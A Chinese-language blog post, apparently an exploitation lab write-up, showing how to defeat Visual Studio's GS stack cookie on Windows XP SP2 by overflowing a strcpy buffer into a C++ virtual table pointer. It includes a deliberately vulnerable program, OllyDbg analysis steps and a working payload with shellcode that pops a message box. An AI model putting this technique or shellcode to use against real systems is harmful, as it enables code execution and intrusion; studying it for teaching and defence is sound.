---
layout:		post
title:		覆盖虚函数突破GS
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp2  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>说明: 《0Day》上是覆盖1 byte就能达到效果, 简便起见这里覆盖4 byte。
<!-- more -->


### 0x00 前期准备

新建一个工程, 贴入以下代码

```
#include <string.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

class GSVirtual{
public:
	void gsv(char *src)
	{
		char buf[200];
		strcpy(buf,src);
		vir();
	}
	virtual void vir()
	{
	}
};

int main()
{
	GSVirtual test;
	__asm int 3
	test.gsv(shellcode);

	return 0;
}
```

项目->属性, 选择release版本, 禁用优化

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x00.png)


### 0x01 分析

运行*.exe, 自动调用OllyDbg附加调试, 成功断在int 3断点

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x01.png)

单步往下, 遇到类成员函数跟进去

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x02.png)

直接F4到这里, 完成了strcpy, 看到下一条指令, eax=ss:[0x0012fe98]=0x0012ff78(虚函数表地址)

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x03.png)

内存区0x0012ff78存放的就是虚表指针

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x04.png)

goto 0x00402100, 这里0x004010a0就是虚函数的入口地址

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x05.png)

再看看copy的数据, 距离虚表指针0x0012ff78还有20 byte

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x06.png)
![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x07.png)

copy的数据源从0x0012fe9c开始, copy的数据从0x00403048开始(两份payload一致)


### 0x02 exploit

组织payload, 将虚表指针覆盖成0x0012fe9c, 即shellcode的起始地址(防着跳板)

```
"\x04\x2b\x99\x7C"		# pop pop retn
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x30\x75\x6e\x67\x68\x77\x6f\x6f\x79\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x9c\xfe\x12\x00"		# "\x48\x30\x40\x00"也可以, 两份数据一样的
```

再次附加调试, 现在数据区布局如下

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x08.png)

经过push->pop->pop->retn, 0x0012fe9c弹给eip, 开始执行shellcode, pwn~

![](/assets/img/exploit/2017-10-02-gsbreak-overflow-vtable/0x09.png)